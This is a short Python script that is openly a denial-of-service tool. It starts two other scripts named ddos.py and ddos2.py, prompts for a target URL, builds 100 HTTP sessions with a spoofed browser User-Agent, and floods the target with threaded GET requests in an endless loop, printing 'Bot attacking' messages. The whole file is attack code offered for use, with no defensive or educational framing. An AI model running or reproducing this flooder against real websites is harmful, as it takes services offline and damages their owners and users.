import requests
import threading
import subprocess

def run_script(script_name):
    subprocess.Popen(["python", script_name])

if __name__ == "__main__":
    run_script("ddos.py")
    run_script("ddos2.py")


target_website = input("Enter target website URL: ")

def create_bots():
    bots = []
    for i in range(100):
        bot = requests.Session()
        bot.headers.update({"User-Agent": "Mozilla/5.0"})
        bots.append(bot)
    return bots

def send_request(bot):
    try:
        response = bot.get(target_website)
        print(f"Bot attacking {target_website}. Response status code: {response.status_code}")
    except:
        print("Error during bot attack")

def ddos_attack():
    bots = create_bots()
    while True:
        threads = []
        for bot in bots:
            t = threading.Thread(target=send_request, args=(bot,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

ddos_attack()
